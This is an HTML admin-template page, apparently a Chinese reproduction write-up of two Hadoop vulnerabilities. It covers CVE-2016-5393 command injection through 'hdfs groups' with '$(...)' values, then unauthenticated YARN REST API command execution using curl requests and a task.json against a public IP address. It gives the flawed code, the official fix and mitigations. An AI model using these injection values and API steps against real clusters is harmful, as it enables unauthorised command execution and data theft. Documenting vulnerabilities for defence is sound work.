<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="A fully featured admin theme which can be used to build CRM, CMS, etc.">
        <meta name="author" content="Coderthemes">

        <!-- App Favicon -->
        <link rel="shortcut icon" href="assets/images/favicon.ico">

        <!-- App title -->
        <title>漏洞检测与复现</title>

        <!-- App CSS -->
        <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link href="assets/css/core.css" rel="stylesheet" type="text/css" />
        <link href="assets/css/components.css" rel="stylesheet" type="text/css" />
        <link href="assets/css/icons.css" rel="stylesheet" type="text/css" />
        <link href="assets/css/pages.css" rel="stylesheet" type="text/css" />
        <link href="assets/css/menu.css" rel="stylesheet" type="text/css" />
        <link href="assets/css/responsive.css" rel="stylesheet" type="text/css" />

        <!-- HTML5 Shiv and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
        <![endif]-->

        <script src="assets/js/modernizr.min.js"></script>

    </head>


    <body class="fixed-left">

        <!-- Begin page -->
        <div id="wrapper">

            <!-- Top Bar Start -->
            <div class="topbar">

                <!-- LOGO -->
                <div class="topbar-left">
                    <a href="index.html" class="logo"><span>Admin<span>to</span></span><i class="zmdi zmdi-layers"></i></a>
                </div>

                <!-- Button mobile view to collapse sidebar menu -->
                <div class="navbar navbar-default" role="navigation">
                    <div class="container">

                        <!-- Page title -->
                        <ul class="nav navbar-nav navbar-left">
                            <li>
                                <button class="button-menu-mobile open-left">
                                    <i class="zmdi zmdi-menu"></i>
                                </button>
                            </li>
                            <li>
                                <h4 class="page-title">Email Templates</h4>
                            </li>
                        </ul>

                        <!-- Right(Notification and Searchbox -->
                        <ul class="nav navbar-nav navbar-right">
                            <li>
                                <!-- Notification -->
                                <div class="notification-box">
                                    <ul class="list-inline m-b-0">
                                        <li>
                                            <a href="javascript:void(0);" class="right-bar-toggle">
                                                <i class="zmdi zmdi-notifications-none"></i>
                                            </a>
                                            <div class="noti-dot">
                                                <span class="dot"></span>
                                                <span class="pulse"></span>
                                            </div>
                                        </li>
                                    </ul>
                                </div>
                                <!-- End Notification bar -->
                            </li>
                            <li class="hidden-xs">
                                <form role="search" class="app-search">
                                    <input type="text" placeholder="Search..."
                                           class="form-control">
                                    <a href=""><i class="fa fa-search"></i></a>
                                </form>
                            </li>
                        </ul>

                    </div><!-- end container -->
                </div><!-- end navbar -->
            </div>
            <!-- Top Bar End -->


            <!-- ========== Left Sidebar Start ========== -->
            <div class="left side-menu">
                <div class="sidebar-inner slimscrollleft">

                    <!-- User -->
                    <div class="user-box">
                        <div class="user-img">
                            <img src="assets/images/users/avatar-1.jpg" alt="user-img" title="Mat Helme" class="img-circle img-thumbnail img-responsive">
                            <div class="user-status offline"><i class="zmdi zmdi-dot-circle"></i></div>
                        </div>
                        <h5><a href="#">Mat Helme</a> </h5>
                        <ul class="list-inline">
                            <li>
                                <a href="#" >
                                    <i class="zmdi zmdi-settings"></i>
                                </a>
                            </li>

                            <li>
                                <a href="#" class="text-custom">
                                    <i class="zmdi zmdi-power"></i>
                                </a>
                            </li>
                        </ul>
                    </div>
                    <!-- End User -->

                    <!--- Sidemenu -->
                    <div id="sidebar-menu">
                        <ul>
                            <li class="text-muted menu-title">Navigation</li>

                            <li>
                                <a href="index.html" class="waves-effect"><i class="zmdi zmdi-view-dashboard"></i> <span> Dashboard </span> </a>
                            </li>

                            <li>
                                <a href="typography.html" class="waves-effect"><i class="zmdi zmdi-format-underlined"></i> <span> Typography </span> </a>
                            </li>

                            <li class="has_sub">
                                <a href="javascript:void(0);" class="waves-effect"><i class="zmdi zmdi-invert-colors"></i> <span> User Interface </span> <span class="menu-arrow"></span></a>
                                <ul class="list-unstyled">
                                    <li><a href="ui-buttons.html">Buttons</a></li>
                                    <li><a href="ui-cards.html">Cards</a></li>
                                    <li><a href="ui-draggable-cards.html">Draggable Cards</a></li>
                                    <li><a href="ui-checkbox-radio.html">Checkboxs-Radios</a></li>
                                    <li><a href="ui-material-icons.html">Material Design Icons</a></li>
                                    <li><a href="ui-font-awesome-icons.html">Font Awesome</a></li>
                                    <li><a href="ui-dripicons.html">Dripicons</a></li>
                                    <li><a href="ui-themify-icons.html">Themify Icons</a></li>
                                    <li><a href="ui-modals.html">Modals</a></li>
                                    <li><a href="ui-notification.html">Notification</a></li>
                                    <li><a href="ui-range-slider.html">Range Slider</a></li>
                                    <li><a href="ui-components.html">Components</a>
                                    <li><a href="ui-sweetalert.html">Sweet Alert</a>
                                    <li><a href="ui-treeview.html">Tree view</a>
                                    <li><a href="ui-widgets.html">Widgets</a></li>
                                </ul>
                            </li>

                            <li class="has_sub">
                                <a href="javascript:void(0);" class="waves-effect"><i class="zmdi zmdi-collection-text"></i><span class="label label-warning pull-right">7</span><span> Forms </span> </a>
                                <ul class="list-unstyled">
                                    <li><a href="form-elements.html">General Elements</a></li>
                                    <li><a href="form-advanced.html">Advanced Form</a></li>
                                    <li><a href="form-validation.html">Form Validation</a></li>
                                    <li><a href="form-wizard.html">Form Wizard</a></li>
                                    <li><a href="form-fileupload.html">Form Uploads</a></li>
                                    <li><a href="form-wysiwig.html">Wysiwig Editors</a></li>
                                    <li><a href="form-xeditable.html">X-editable</a></li>
                                </ul>
                            </li>

                            <li class="has_sub">
                                <a href="javascript:void(0);" class="waves-effect"><i class="zmdi zmdi-view-list"></i> <span> Tables </span> <span class="menu-arrow"></span></a>
                                <ul class="list-unstyled">
                                    <li><a href="tables-basic.html">Basic Tables</a></li>
                                    <li><a href="tables-datatable.html">Data Table</a></li>
                                    <li><a href="tables-responsive.html">Responsive Table</a></li>
                                    <li><a href="tables-editable.html">Editable Table</a></li>
                                    <li><a href="tables-tablesaw.html">Tablesaw Table</a></li>
                                </ul>
                            </li>

                            <li class="has_sub">
                                <a href="javascript:void(0);" class="waves-effect"><i class="zmdi zmdi-chart"></i><span> Charts </span> <span class="menu-arrow"></span></a>
                                <ul class="list-unstyled">
                                    <li><a href="chart-flot.html">Flot Chart</a></li>
                                    <li><a href="chart-morris.html">Morris Chart</a></li>
                                    <li><a href="chart-chartist.html">Chartist Charts</a></li>
                                    <li><a href="chart-chartjs.html">Chartjs Chart</a></li>
                                    <li><a href="chart-other.html">Other Chart</a></li>
                                </ul>
                            </li>

                            <li>
                                <a href="calendar.html" class="waves-effect"><i class="zmdi zmdi-calendar"></i><span> Calendar </span></a>
                            </li>

                            <li>
                                <a href="inbox.html" class="waves-effect"><i class="zmdi zmdi-email"></i><span class="label label-purple pull-right">New</span><span> Mail </span></a>
                            </li>

                            <li class="has_sub">
                                <a href="javascript:void(0);" class="waves-effect"><i class="zmdi zmdi-collection-item"></i><span> Pages </span> <span class="menu-arrow"></span></a>
                                <ul class="list-unstyled">
                                    <li><a href="page-starter.html">Starter Page</a></li>
                                    <li><a href="page-login.html">Login</a></li>
                                    <li><a href="page-register.html">Register</a></li>
                                    <li><a href="page-recoverpw.html">Recover Password</a></li>
                                    <li><a href="page-lock-screen.html">Lock Screen</a></li>
                                    <li><a href="page-confirm-mail.html">Confirm Mail</a></li>
                                    <li><a href="page-404.html">Error 404</a></li>
                                    <li><a href="page-500.html">Error 500</a></li>
                                </ul>
                            </li>

                            <li class="has_sub">
                                <a href="javascript:void(0);" class="waves-effect"><i class="zmdi zmdi-layers"></i><span>Extra Pages </span> <span class="menu-arrow"></span></a>
                                <ul class="list-unstyled">
                                    <li><a href="extras-projects.html">Projects</a></li>
                                    <li><a href="extras-tour.html">Tour</a></li>
                                    <li><a href="extras-taskboard.html">Taskboard</a></li>
                                    <li><a href="extras-taskdetail.html">Task Detail</a></li>
                                    <li><a href="extras-profile.html">Profile</a></li>
                                    <li><a href="extras-maps.html">Maps</a></li>
                                    <li><a href="extras-contact.html">Contact list</a></li>
                                    <li><a href="extras-pricing.html">Pricing</a></li>
                                    <li><a href="extras-timeline.html">Timeline</a></li>
                                    <li><a href="extras-invoice.html">Invoice</a></li>
                                    <li><a href="extras-faq.html">FAQ</a></li>
                                    <li><a href="extras-gallery.html">Gallery</a></li>
                                    <li><a href="extras-email-template.html">Email template</a></li>
                                    <li><a href="extras-maintenance.html">Maintenance</a></li>
                                    <li><a href="extras-comingsoon.html">Coming soon</a></li>
                                </ul>
                            </li>

                        </ul>
                        <div class="clearfix"></div>
                    </div>
                    <!-- Sidebar -->
                    <div class="clearfix"></div>

                </div>

            </div>
            <!-- Left Sidebar End -->



            <!-- ============================================================== -->
            <!-- Start right Content here -->
            <!-- ============================================================== -->
            <div class="content-page">
                <!-- Start content -->
                <div class="content">
                    <div class="container">

                        <div class="row">
                            <div class="col-md-12">
                                <div class="card-box">
                                	<div class="row">
										<div class="col-md-6">
											<h3 class="m-t-0 m-b-20 header-title">
                                                <b>CVE-2016-5393</b>
                                            </h3>
                                            <p>
                                                首先，进入Hadoop配置文件夹，编辑core-site.xml配置文件，修改属性hadoop.security.group.mapping，将原本默认属性值org.apache.hadoop.security.JniBasedUnixGroupsMappingWithFallback修改为org.apache.hadoop.security.ShellBasedUnixGroupsMapping
                                                <br/>
                                                <!-- <hr style=" height:2px;border:none;border-top:2px dotted #185598;" />  -->
                                            </p>
											<img src="assets/images/VunImage/vun1/1.png" class="img-responsive" alt="">
                                            <br/>
                                            <p>
                                                接下来保存配置并退出，使用hadoop/sbin目录下的stop-all.sh命令与start-all.sh命令重启hadoop。完成配置更新，接下来在hadoop/bin目录下执行命令./hdfs groups ‘$(ping 127.0.0.1)’
                                                <br/>
                                                <!-- <hr style=" height:2px;border:none;border-top:2px dotted #185598;" /> -->
                                            </p>
                                            <br/>
                                            <img src="assets/images/VunImage/vun1/2.png" class="img-responsive" alt="">
                                            <br/>
                                            <p>
                                                groups命令原本意思为查找名字为$(ping 127.0.0.1)的group以及其组内所有成员，例如我执行./hdfs groups ‘hadoop’与./hdfs groups ‘hadoop’，结果如下:
                                            </p>
                                            <br/>
                                            <img src="assets/images/VunImage/vun1/3.png" class="img-responsive" alt="">
                                            <br/>
                                            <p>
                                                输出了‘hadoop‘ :hadoop sudo表明hadoop组含有一个成员hadoop，其中用户hadoop为超级用户。第二个例子输出了‘hadoopPlus‘ :hadoopPlus表明hadoop组含有一个成员hadoop,
                                                但是当我们执行命令/hdfs groups ‘$(ping 127.0.0.1)’时，我们发现：
                                            </p>
                                            <br/>
                                            <img src="assets/images/VunImage/vun1/4.png" class="img-responsive" alt="">
                                            <br/>
                                            <p>
                                                当我们用ps aux|grep --color "ping 12"命令时，发现后台正在不断运行ping 127.0.0.1命令。
                                                所以我们可以利用该漏洞进行任何我们想要的操作，例如：
                                            </p>
                                            <h5>1)  /hdfs groups ‘$(mkdir test)’</h5>
                                            <br/>
                                            <img src="assets/images/VunImage/vun1/5.png" class="img-responsive" alt="">
                                            <br/>
                                            <h5>2)  /hdfs groups ‘$(touch test)’</h5>
                                            <br/>
                                            <img src="assets/images/VunImage/vun1/6.png" class="img-responsive" alt="">
                                            <br/>
                                            远程用户可以利用该漏洞HDFS服务权限运行<span style="text-color:#185598">任意命令</span>
                                            <h4><strong>漏洞原因</strong></h4>
                                            <pre>
                                                <code>
public static String[] getGroupsForUserCommand(final String user) {
    //'groups username' command return is inconsistent across different unixes
    return WINDOWS ?
        new String[]
        {getWinUtilsPath(), "groups", "-F", "\"" + user + "\""}
        : new String[] {"bash", "-c", "id -gn " + user + "; id -Gn " + user};
}</code>
                                            </pre>
                                            <h4><strong>官方修复方法</strong></h4>
                                            <pre>
                                                <code>
static String bashQuote(String arg) {
  StringBuilder buffer = new StringBuilder(arg.length() + 2);
  buffer.append('\'');
  buffer.append(arg.replace("'", "'\\''"));
  buffer.append('\'');
  return buffer.toString();
}

public static String[] getGroupsForUserCommand(final String user) {
  //'groups username' command return is inconsistent across different unixes
  if (WINDOWS) {
    return new String[]
        {getWinUtilsPath(), "groups", "-F", "\"" + user + "\""};
  } else {
    String quotedUser = bashQuote(user);
    return new String[] {"bash", "-c", "id -gn " + quotedUser +
                          "; id -Gn " + quotedUser};
  }
}
                                                </code>
                                            </pre>
                                            <br/>
                                            <h4><strong>Cve-2016-5393漏洞解决方案</strong></h4>
                                            <h5>1、从hdfs groups命令入手，修改该命令</h5>
                                            <br/>
                                            <img src="assets/images/VunImage/vun1/7.png" class="img-responsive" alt="">
                                            <br/>
                                            <p>将该命令设为自动对‘name‘执行如同hadoop官方更新的相同变换</p>
                                            <br/>
                                            <img src="assets/images/VunImage/vun1/8.jpg" class="img-responsive" alt="">
                                            <br/>
                                            <p>程序调用脚本时把参数变成了字符串，此时不会执行ping 127.0.0.1命令</p>

										</div>
						
										<div class="col-md-6">
											<h3 class="m-t-0 m-b-20 header-title"><b>YARN REST API未验证用户提权漏洞</b></h>
                                            <h4><strong>漏洞说明</strong></h4>
                                            <p>
                                                YARN是hadoop系统的资源管理统一平台，主要为了资源的统一调度。用户可以给YARN提交特定用户程序，其中允许执行相关系统命令。YARN提供有默认开放8088的REST API，用户可以直接通过相关API进行应用的创建、任务的提交执行等操作，如果resource manager暴露在公网中，将导致未授权访问的问题。
                                            </p>
                                            <h4><strong>漏洞复现</strong></h4>
                                            <br/>
                                            1、申请新的application
                                            参考网址：<a href="http://hadoop.apache.org/docs/current/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html#Cluster_New_Application_API">
                                                http://hadoop.apache.org/docs/current/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html#Cluster_New_Application_API
                                            </a>
                                            <p>
                                                直接根据resource manager的rest api进行应用的创建：
                                                命令：curl -i -X POST ‘http://36.155.126.101:8088/ws/v1/cluster/apps/new-application’ > curl_res
                                                说明：用POST请求的方式调用new-application这个api，进行应用的创建，并将返回结果保存到curl_res文件中，获取curl_res文件内容 cat curl_res
                                            </p>
                                            <pre>
HTTP/1.1 200 OK
Cache-Control: no-cache
Expires: Tue, 20 Nov 2018 05:17:30 GMT
Date: Tue, 20 Nov 2018 05:17:30 GMT
Pragma: no-cache
Expires: Tue, 20 Nov 2018 05:17:30 GMT
Date: Tue, 20 Nov 2018 05:17:30 GMT
Pragma: no-cache
Content-Type: application/json
Transfer-Encoding: chunked
Server: Jetty(6.1.26)

{"application-id":"application_1540519343704_0011","maximum-resource-capability":{"memory":8192,"vCores":8}}
                                                
                                            </pre>
                                            <h4><strong>2、构建并提交应用</strong></h4>
                                            参考网址：<a href="http://hadoop.apache.org/docs/current/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html#Cluster_Applications_APISubmit_Application">http://hadoop.apache.org/docs/current/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html#Cluster_Applications_APISubmit_Application</a>
                                            构建如下task.json文件：
                                            <pre>
{
    "am-container-spec":{
        "commands":{
            "command":"echo '111' > /var/tmp/test.txt"
        }
    },
    "application-id":"application_1540519343704_0011",
    "application-name":"test",
    "application-type":"YARN"
}

                                            </pre>
                                            然后通过POST方式提交任务：
                                            curl -i -s X POST -H ‘Accept:application/json’ -H ‘Content-Type:application/json’ http://36.155.126.101:8088/ws/v1/cluster/apps -d@task.json
                                            然后可以查询任务详情：
                                            curl -i -s -X GET ‘http://36.155.126.101:8088/ws/v1/cluster/apps/ application_1540519343704_0011，结果如下

                                            <pre>
{
    "app":
    {
        "id":"application_1540519343704_0011",
        "user":"dr.who",
        "name":"test",
        "queue":"default",
        "state":"FAILED",
        "finalStatus":"FAILED",
        "progress":0.0,
        "trackingUI":"History",
        "trackingUrl":"http://localhost:8088/cluster/app/application_1540519343704_0011",
        ……
        "clusterId":1540519343704,
        "applicationType":"YARN",
        "applicationTags":"",
        "startedTime":1542691811610,
        "finishedTime":1542691815606,
        "elapsedTime":3996,
"amContainerLogs":"http://localhost:8042/node/containerlogs/、container_1540519343704_0011_02_000001/dr.who",
        "amHostHttpAddress":"localhost:8042",
        "allocatedMB":-1,
        "allocatedVCores":-1,
        "runningContainers":-1,
        "memorySeconds":2051,
        "vcoreSeconds":2,
        "preemptedResourceMB":0,
        "preemptedResourceVCores":0,
        "numNonAMContainerPreempted":0,
        "numAMContainerPreempted":0
    }
}

                                            </pre>
                                            可以看到任务已经成功完成，我们可以在相关目录下查看到命令运行结果：
                                            <span><strong>ls  /var/tmp</strong></span>
                                            <br/>
                                            <br/>
											<img src="assets/images/VunImage/vun2/1.png" class="img-responsive" alt="">
                                            <br/>
                                            <span><strong>cat /vat/tmp/test.txt</strong></span>
                                            <br/>
                                            <br/>
                                            <img src="assets/images/VunImage/vun2/2.png" class="img-responsive" alt="">
                                            <br/>

                                            <h4><strong>漏洞总结</strong></h4><br/>
                                            通过这个漏洞，攻击者可以将command命令下载预先写好的脚本程序，并执行脚本程序，达到利用机器执行自己的相关木马程序或者盗取数据
                                            <h4><strong>应对方案</strong><h4><br/>
                                                <ol>
                                                    <li>
                                                        开启kerbose验证，禁止匿名访问rest api
                                                    </li>
                                                    <li>
                                                        配置安全组策略，避免将resource manager所在ip暴露在公网中
                                                    </li>
                                                </ol>

										</div>
									</div>
                                </div>
                            </div><!-- end col -->
                        </div>
                        <!-- end row -->


                    </div> <!-- container -->

                </div> <!-- content -->

                <footer class="footer">
                    2016 - 2017 © Adminto.
                </footer>

            </div>


            <!-- ============================================================== -->
            <!-- End Right content here -->
            <!-- ============================================================== -->


            <!-- Right Sidebar -->
            <div class="side-bar right-bar">
                <a href="javascript:void(0);" class="right-bar-toggle">
                    <i class="zmdi zmdi-close-circle-o"></i>
                </a>
                <h4 class="">Notifications</h4>
                <div class="notification-list nicescroll">
                    <ul class="list-group list-no-border user-list">
                        <li class="list-group-item">
                            <a href="#" class="user-list-item">
                                <div class="avatar">
                                    <img src="assets/images/users/avatar-2.jpg" alt="">
                                </div>
                                <div class="user-desc">
                                    <span class="name">Michael Zenaty</span>
                                    <span class="desc">There are new settings available</span>
                                    <span class="time">2 hours ago</span>
                                </div>
                            </a>
                        </li>
                        <li class="list-group-item">
                            <a href="#" class="user-list-item">
                                <div class="icon bg-info">
                                    <i class="zmdi zmdi-account"></i>
                                </div>
                                <div class="user-desc">
                                    <span class="name">New Signup</span>
                                    <span class="desc">There are new settings available</span>
                                    <span class="time">5 hours ago</span>
                                </div>
                            </a>
                        </li>
                        <li class="list-group-item">
                            <a href="#" class="user-list-item">
                                <div class="icon bg-pink">
                                    <i class="zmdi zmdi-comment"></i>
                                </div>
                                <div class="user-desc">
                                    <span class="name">New Message received</span>
                                    <span class="desc">There are new settings available</span>
                                    <span class="time">1 day ago</span>
                                </div>
                            </a>
                        </li>
                        <li class="list-group-item active">
                            <a href="#" class="user-list-item">
                                <div class="avatar">
                                    <img src="assets/images/users/avatar-3.jpg" alt="">
                                </div>
                                <div class="user-desc">
                                    <span class="name">James Anderson</span>
                                    <span class="desc">There are new settings available</span>
                                    <span class="time">2 days ago</span>
                                </div>
                            </a>
                        </li>
                        <li class="list-group-item active">
                            <a href="#" class="user-list-item">
                                <div class="icon bg-warning">
                                    <i class="zmdi zmdi-settings"></i>
                                </div>
                                <div class="user-desc">
                                    <span class="name">Settings</span>
                                    <span class="desc">There are new settings available</span>
                                    <span class="time">1 day ago</span>
                                </div>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <!-- /Right-bar -->

        </div>
        <!-- END wrapper -->



        <script>
            var resizefunc = [];
        </script>

        <!-- jQuery  -->
        <script src="assets/js/jquery.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/detect.js"></script>
        <script src="assets/js/fastclick.js"></script>
        <script src="assets/js/jquery.slimscroll.js"></script>
        <script src="assets/js/jquery.blockUI.js"></script>
        <script src="assets/js/waves.js"></script>
        <script src="assets/js/jquery.nicescroll.js"></script>
        <script src="assets/js/jquery.scrollTo.min.js"></script>

        <!-- App js -->
        <script src="assets/js/jquery.core.js"></script>
        <script src="assets/js/jquery.app.js"></script>

    </body>
</html>